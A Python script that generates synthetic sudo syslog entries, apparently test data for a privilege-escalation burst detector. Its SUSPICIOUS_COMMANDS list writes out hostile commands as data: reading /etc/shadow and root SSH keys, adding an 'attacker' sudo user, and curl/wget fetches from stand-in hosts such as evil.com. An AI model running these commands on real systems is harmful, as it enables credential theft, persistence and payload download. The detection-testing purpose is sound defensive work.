"""
Generate synthetic sudo logs with diverse users and burst patterns.
Creates realistic privilege escalation scenarios for testing.
"""

import random
from datetime import datetime, timedelta

# System users who might use sudo
USERS = [
    'alice', 'bob', 'charlie', 'dave', 'eve', 'frank', 'grace', 'henry',
    'iris', 'jack', 'karen', 'leo', 'mary', 'nancy', 'oscar', 'paul',
    'quinn', 'rachel', 'steve', 'tina', 'uma', 'victor', 'wendy', 'xavier',
    'admin', 'sysadmin', 'devops', 'operator', 'webmaster', 'backup'
]

# Suspicious commands with severity
SUSPICIOUS_COMMANDS = [
    # Critical - Credential Access
    ('/usr/bin/cat /etc/shadow', 'Credential Access', 'Critical'),
    ('/usr/bin/vim /etc/shadow', 'Credential Access', 'Critical'),
    ('/usr/bin/cat /root/.ssh/id_rsa', 'Credential Access', 'Critical'),
    ('/usr/bin/cp /root/.ssh/id_rsa /tmp/', 'Credential Access', 'Critical'),

    # High - Persistence
    ('/usr/bin/vim /etc/sudoers', 'Persistence', 'High'),
    ('/usr/bin/useradd -m attacker', 'Persistence', 'High'),
    ('/usr/bin/crontab -e', 'Persistence', 'High'),
    ('/usr/bin/usermod -aG sudo attacker', 'Persistence', 'High'),

    # Medium - Download and Execute
    ('/usr/bin/curl http://malicious.com/payload.sh', 'Download and Execute', 'Medium'),
    ('/usr/bin/wget http://evil.com/backdoor', 'Download and Execute', 'Medium'),
    ('/usr/bin/curl -o /tmp/script.sh http://bad.com/s', 'Download and Execute', 'Medium'),
]

# Benign commands (won't trigger alerts)
BENIGN_COMMANDS = [
    '/usr/bin/systemctl restart nginx',
    '/usr/bin/apt-get update',
    '/usr/bin/docker ps',
    '/usr/bin/journalctl -u sshd',
    '/usr/bin/tail -f /var/log/syslog',
    '/usr/bin/chmod 755 /opt/app/script.sh',
    '/usr/bin/chown www-data:www-data /var/www/html',
]

def generate_sudo_log_entry(timestamp, user, command, target_user='root'):
    """Generate a single sudo log line in syslog format."""
    return (f"{timestamp.strftime('%b %d %H:%M:%S')} server sudo: {user.ljust(10)}: "
            f"TTY=pts/{random.randint(0, 50)} ; PWD=/home/{user} ; "
            f"USER={target_user} ; COMMAND={command}")

def generate_burst_pattern(user, start_time, num_commands=5):
    """Generate a burst of sudo commands from one user."""
    lines = []
    current_time = start_time

    # Mix of suspicious and benign commands
    for _ in range(num_commands):
        # 60% chance of suspicious command in a burst (realistic for attacker)
        if random.random() < 0.6:
            command, _, _ = random.choice(SUSPICIOUS_COMMANDS)
        else:
            command = random.choice(BENIGN_COMMANDS)

        lines.append(generate_sudo_log_entry(current_time, user, command))
        # Bursts happen quickly (5-20 seconds apart)
        current_time += timedelta(seconds=random.randint(5, 20))

    return lines

def generate_isolated_suspicious_commands(num_commands=600):
    """Generate isolated suspicious commands (non-burst)."""
    lines = []
    current_time = datetime(2026, 8, 7, 14, 0, 0)

    for _ in range(num_commands):
        user = random.choice(USERS)
        command, _, _ = random.choice(SUSPICIOUS_COMMANDS)

        lines.append(generate_sudo_log_entry(current_time, user, command))
        # Isolated commands have bigger time gaps (1-5 minutes)
        current_time += timedelta(seconds=random.randint(60, 300))

    return lines

def generate_sudo_logs(output_file='sudo_diverse_sample.log',
                       num_burst_users=20,
                       burst_size_range=(3, 10),
                       num_isolated=400):
    """
    Generate sudo logs with burst patterns and isolated suspicious commands.

    Args:
        output_file: Output filename
        num_burst_users: Number of users who perform burst activity
        burst_size_range: (min, max) commands per burst
        num_isolated: Number of isolated suspicious commands
    """

    print(f"Generating sudo logs...")
    print(f"  - Burst patterns: {num_burst_users} users")
    print(f"  - Isolated suspicious commands: {num_isolated}")

    lines = []
    current_time = datetime(2026, 8, 7, 14, 15, 14)

    # Generate burst patterns
    burst_users = random.sample(USERS, min(num_burst_users, len(USERS)))

    for user in burst_users:
        burst_size = random.randint(*burst_size_range)
        burst_lines = generate_burst_pattern(user, current_time, burst_size)
        lines.extend(burst_lines)

        # Move time forward significantly between different users' bursts
        current_time += timedelta(minutes=random.randint(5, 30))

    # Generate isolated suspicious commands
    isolated_lines = generate_isolated_suspicious_commands(num_isolated)
    lines.extend(isolated_lines)

    # Shuffle to simulate concurrent activity
    random.shuffle(lines)

    # Sort by timestamp
    def parse_time(line):
        parts = line.split()
        month = parts[0]
        day = int(parts[1])
        time_str = parts[2]
        months = {'Jan': 1, 'Feb': 2, 'Mar': 3, 'Apr': 4, 'May': 5, 'Jun': 6,
                  'Jul': 7, 'Aug': 8, 'Sep': 9, 'Oct': 10, 'Nov': 11, 'Dec': 12}
        return (months.get(month, 8), day, time_str)

    lines.sort(key=parse_time)

    # Write to file
    with open(output_file, 'w') as f:
        f.write('\n'.join(lines))
        f.write('\n')

    print(f"\nGenerated {len(lines)} sudo log entries")
    print(f"Output: {output_file}")
    print(f"\nExpected results when analyzed:")
    print(f"  - Sudo burst alerts: ~{num_burst_users} (threshold=3, window=120s)")
    print(f"  - Suspicious command alerts: ~{num_isolated + (num_burst_users * 3)} (approx)")
    print(f"\nSample burst users:")
    for i, user in enumerate(burst_users[:5]):
        print(f"  {user}")

if __name__ == "__main__":
    # Generate logs with more burst patterns
    generate_sudo_logs(
        output_file='sudo_diverse_sample.log',
        num_burst_users=30,        # 30 users will have burst activity
        burst_size_range=(5, 15),   # Each burst: 5-15 commands
        num_isolated=500            # 500 isolated suspicious commands
    )

    print("\nYou can now use this file in extract.py:")
    print('  with open("sudo_diverse_sample.log") as f:')
    print('      for line in f:')
    print('          event = parse_sudo_event(line, 2026)')
    print('  sudo_burst_alerts = detect_sudo_burst("sudo_diverse_sample.log", threshold=3, window_seconds=120)')
